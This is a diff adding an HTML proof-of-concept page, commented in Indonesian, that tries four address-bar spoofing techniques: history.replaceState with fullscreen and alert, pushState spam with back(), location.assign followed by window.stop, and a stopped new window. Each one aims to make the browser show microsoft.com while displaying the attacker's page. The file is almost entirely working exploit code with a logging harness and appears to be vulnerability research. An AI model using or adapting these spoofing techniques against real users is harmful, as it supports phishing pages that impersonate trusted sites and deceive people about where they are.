@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>History Replace Race - Real Spoof</title>
+<style>
+  body { font-family: 'Segoe UI', sans-serif; padding:40px; background:#f0f4ff; }
+  button { padding:14px 24px; background:#0078d4; color:#fff; border:none;
+           border-radius:6px; font-size:15px; cursor:pointer; margin:8px; display:block; }
+  pre { font-size:13px; background:#fff; padding:14px; border-radius:6px; margin-top:14px; }
+</style>
+</head>
+<body>
+<h3>Address Bar Race — Teknik tanpa window.open</h3>
+<p style="font-size:13px;color:#888;margin-bottom:14px;">
+Teknik ini bukan buka window baru. Ini manipulasi address bar di TAB YANG SAMA
+dengan kombinasi replaceState + fullscreen + alert.
+</p>
+
+<button onclick="technique1()">Teknik 1: replaceState → fullscreen → alert</button>
+<button onclick="technique2()">Teknik 2: pushState spam → back → alert</button>
+<button onclick="technique3()">Teknik 3: location.assign → stop → replaceState</button>
+<button onclick="technique4()">Teknik 4: meta refresh + opener null</button>
+
+<pre id="log"></pre>
+<script>
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+
+// Teknik 1: replaceState ke URL target, fullscreen (hide real bar),
+// alert (block update). Saat alert muncul, cek address bar.
+function technique1(){
+  log('TEKNIK 1: replaceState + fullscreen + alert()');
+  log('  Step 1: replaceState ke https://microsoft.com/');
+  try {
+    history.replaceState(null, '', 'https://microsoft.com/');
+  } catch(e){ log('  replaceState error: ' + e.message); }
+
+  log('  Step 2: requestFullscreen (hide real toolbar)');
+  try { document.documentElement.requestFullscreen(); } catch(e){}
+
+  log('  Step 3: alert() — CEK ADDRESS BAR SEKARANG!');
+  log('  >>> Apakah address bar nunjukin "microsoft.com" atau URL asli?');
+  alert('Test 1: Lihat address bar sekarang. Tampil apa?');
+  log('  Alert closed. Address bar sekarang: ' + location.href);
+}
+
+// Teknik 2: pushState banyak → back cepat → alert
+function technique2(){
+  log('TEKNIK 2: pushState spam + back + alert()');
+  log('  Step 1: pushState 5x ke URL berbeda');
+  for (var i=0; i<5; i++){
+    try { history.pushState({}, '', '/microsoft.com/account/login/' + i); } catch(e){}
+  }
+  log('  Step 2: back() 2x');
+  history.back();
+  setTimeout(function(){
+    history.back();
+    log('  Step 3: alert() — CEK ADDRESS BAR!');
+    log('  >>> Apakah address bar nunjukin "/microsoft.com/account/login/" atau URL asli?');
+    alert('Test 2: Lihat address bar. Tampil apa?');
+    log('  Alert closed. Address bar: ' + location.href);
+  }, 100);
+}
+
+// Teknik 3: assign ke target → stop (cancel) → replaceState
+function technique3(){
+  log('TEKNIK 3: location.assign + window.stop + replaceState');
+  log('  Step 1: assign ke microsoft.com');
+  location.assign('https://www.microsoft.com/');
+  log('  Step 2: window.stop() — batalkan navigasi sebelum selesai');
+  try { window.stop(); } catch(e){}
+  log('  Step 3: replaceState ke microsoft.com (paksa address bar update)');
+  try {
+    history.replaceState(null, '', 'https://www.microsoft.com/');
+  } catch(e){ log('  replaceState error: ' + e.message); }
+  log('  >>> CEK ADDRESS BAR: microsoft.com tapi konten = halaman attacker?');
+  log('  Address bar: ' + location.href);
+}
+
+// Teknik 4: meta refresh + window.opener null
+function technique4(){
+  log('TEKNIK 4: meta refresh via JS + opener null');
+  log('  Step 1: Buka window baru ke halaman sendiri');
+  var w = window.open(location.href, '_blank');
+  if (!w){ log('  window.open blocked. Test gagal.'); return; }
+  log('  Step 2: null-kan opener (isolasi window)');
+  w.opener = null;
+  log('  Step 3: w.location.replace ke microsoft.com');
+  try {
+    w.location.replace('https://www.microsoft.com/');
+    log('  Step 4: setTimeout 300ms → window.stop di window baru');
+    setTimeout(function(){
+      try { w.stop(); } catch(e){}
+      try {
+        w.history.replaceState(null, '', 'https://www.microsoft.com/');
+      } catch(e){}
+      log('  >>> CEK window baru: address bar = microsoft.com?');
+      log('  >>> Konten = blank/stopped?');
+      log('  >>> Kalau address bar microsoft.com tapi konten kosong = spoof!');
+    }, 300);
+  } catch(e){ log('  Error: ' + e.message); }
+}
+</script>
+</body>
+</html>
